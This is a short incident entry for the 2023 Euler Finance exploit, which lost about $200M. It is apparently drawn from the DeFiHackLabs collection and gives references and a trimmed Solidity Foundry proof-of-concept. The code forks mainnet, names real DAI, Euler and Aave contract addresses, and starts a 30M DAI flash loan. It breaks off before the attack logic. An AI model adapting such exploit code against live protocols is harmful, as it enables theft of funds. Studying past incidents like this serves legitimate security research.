# [?] - EulerFinance - Business Logic Flaw

## Summary
Severity: Unknown
Chain: Ethereum
Component: Euler
Published: 2023-03-13
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/Euler_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$200M
References:
- https://twitter.com/FrankResearcher/status/1635241475989721089
- https://twitter.com/nomorebear/status/1635230621856600064
- https://twitter.com/peckshield/status/1635229594596036608
- https://twitter.com/BlockSecTeam/status/1635262150624305153

```solidity
contract ContractTest is Test {
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    Iviolator violator;
    Iliquidator liquidator;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_817_995);
        cheats.label(address(DAI), "DAI");
        cheats.label(address(eDAI), "eDAI");
        cheats.label(address(dDAI), "dDAI");
        cheats.label(address(Euler), "Euler");
        cheats.label(address(AaveV2), "AaveV2");
    }

    function testExploit() public {
        uint256 aaveFlashLoanAmount = 30_000_000 * 1e18;
        address[] memory assets = new address[](1);
        assets[0] = address(DAI);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveFlashLoanAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        bytes memory params =
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/Euler_exp.sol_
